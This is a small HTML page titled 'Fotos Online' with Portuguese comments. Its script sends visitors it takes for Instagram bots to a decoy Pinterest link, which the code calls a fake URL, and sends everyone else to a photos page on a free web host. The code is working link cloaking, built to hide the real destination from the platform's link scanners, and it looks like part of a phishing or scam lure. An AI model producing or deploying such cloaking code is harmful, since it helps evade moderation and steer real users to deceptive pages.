<!DOCTYPE html>
<html>
<head>
    <title>Fotos Online</title>
</head>
<body>
    <script>
        // Detectar se é um bot do Instagram
        var isInstagramBot = (function() {
            var referrer = document.referrer.toLowerCase();

            // Verificar se o referenciador contém "instagram.com"
            return referrer.indexOf("instagram.com") !== -1;
        })();

        // Verificar se é um usuário normal que enviou o link
        var isUserLink = (function() {
            var urlParams = new URLSearchParams(window.location.search);
            return urlParams.has("utm_source") && urlParams.get("utm_source") === "instagram";
        })();

        // Redirecionar apenas bots do Instagram para um URL falso
        if (isInstagramBot && !isUserLink) {
            var fakeUrl = "https://pin.it/14yHzrk"; // URL falso para redirecionar bots do Instagram
            window.location.replace(fakeUrl);
        } else {
            // Permite que usuários normais acessem o site principal
            window.location.href = 'https://fotos-2023-online-com.000webhostapp.com/fotos.html';
        }
    </script>
</body>
</html>
